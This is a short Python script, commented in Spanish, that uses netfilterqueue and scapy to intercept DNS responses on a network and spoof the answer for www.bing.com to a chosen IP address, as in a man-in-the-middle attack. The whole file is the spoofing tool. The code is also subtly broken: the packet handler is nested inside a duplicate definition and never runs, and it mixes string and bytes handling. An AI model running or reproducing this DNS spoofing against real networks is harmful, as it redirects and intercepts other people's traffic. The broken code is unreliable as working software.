from time import process_time_ns
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    def process_packet(packet):
        try:
            scapy_packet = scapy.IP(packet.get_payload())  # Interpreta el paquete como capa IP
            print(scapy_packet.summary())  # Imprime un resumen del paquete
            if scapy_packet.haslayer(scapy.DNSRR):  # Verifica si tiene respuesta DNS
                #print("DNS Response Intercepted")
                qname = scapy_packet[scapy.DNSRR].qname  # Muestra los detalles del paquete
                if "www.bing.com" in qname:
                    print("[+] Spoofing target")
                    answer = scapy.DNSRR(rrname=qname, rdata="8.8.8.8")
                    scapy_packet[scapy.DNS].an = answer

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(str(scapy_packet))

        except Exception as e:
            print(f"Error: {e}")
        packet.accept()  # Asegúrate de aceptar el paquete después de procesarlo


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("Starting queue...")
    queue.run()
except KeyboardInterrupt:
    print("Stopping queue.")
